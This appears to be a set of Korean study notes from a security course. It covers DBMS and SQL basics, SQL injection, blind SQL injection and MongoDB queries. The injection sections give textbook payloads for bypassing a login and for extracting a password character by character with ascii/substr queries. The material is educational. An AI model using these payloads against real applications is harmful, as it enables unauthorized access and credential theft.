## DBMS

데이터베이스 관리 시스템
데이터베이스에 정보를 기록, 수정, 삭제하는 기능을 수행함
다수의 사람들이 동시에 데이터베이스에 접근할 수 있도록 지원해주는 말그대로 매니저

관계형 : MySQL, MariaDB, PostgreSQL, SQLite
비관계형 : MongoDB, CouchDB, Redis

## SQL

Structed Query Language
RDBMS의 데이터를 정의, 질의, 수정 등 하기 위한 언어

DDL(Define) : 데이터 정의, 스키마(Table) 및 DB의 생성, 수정, 삭제
DML(Manipulate) : 데이터 조작, 테이블 내 데이터에 대한 생성, 수정, 삭제, 조회
DCL(Control) : 접근 권한 설정(Grant, Revoke)

### DDL

```sql
CREATE DATABASE Dreamhack;

USE Dreamhack;
CREATE TABLE Board(
	idx INT AUTO_INCREMENT,
	boardTitle VARCHAR(100) NOT NULL,
	boardContent VARCHAR(2000) NOT NULL,
	PRIMARY KEY(idx)
);
```

### DML

```sql
INSERT INTO 
  Board(boardTitle, boardContent, createdDate) 
Values(
  'Hello', 
  'World !',
  Now()
);

SELECT 
  boardTitle, boardContent
FROM
  Board
Where
  idx=1;

UPDATE Board SET boardContent='DreamHack!' 
  Where idx=1;
```

## SQL Injection

쿼리를 임의로 조작해서 데이터베이스의 정보를 획득

### 가장 간단한 SQL Injection 기법들

```sql
select * from user_table where uid='admin' or '1' and upw='';
select * from user_table where uid='admin'-- '' and upw=''; // --, #, /**/
select uid from user_table where uid='admin' union select upw from user_table where uid='admin'
```

## Blind SQL Injection

True, False 응답을 통해 정답을 알아가는 방식
쿼리에 대한 결과를 화면에서 직접 확인할 수 없을 때 사용

```dart
ascii('a') => 97
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

```sql
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False (첫번째 글자가 r인지)
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True (첫번째 글자가 s인지)

SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False (두번째 글자가 s인지)
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True  (두번째 글자가 t인자)
```

Blind SQL Injection은 여러번 시도해야 하기 때문에 스크립트로 작성

## NoSQL

비관계형 데이터베이스(키-값 쌍으로 데이터를 저장)
DBMS 종류에 따라 다양한 구조, 문법이 있음

### MongoDB

Collection 정의 필요 없음 => 테이블과 동일한 개념
JSON 형식으로 쿼리를 작성
_id 필드가 Primary Key 역할을 수행

```sql
SELECT * FROM inventory WHERE status = "A" and qty < 30;
db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )
```

```bash
$ mongo
> db.user.insert({uid: 'admin', upw: 'secretpassword'})
WriteResult({ "nInserted" : 1 })
> db.user.find({uid: 'admin'})
{ "_id" : ObjectId("5e71d395b050a2511caa827d"), "uid" : "admin", "upw" : "secretpassword" }
```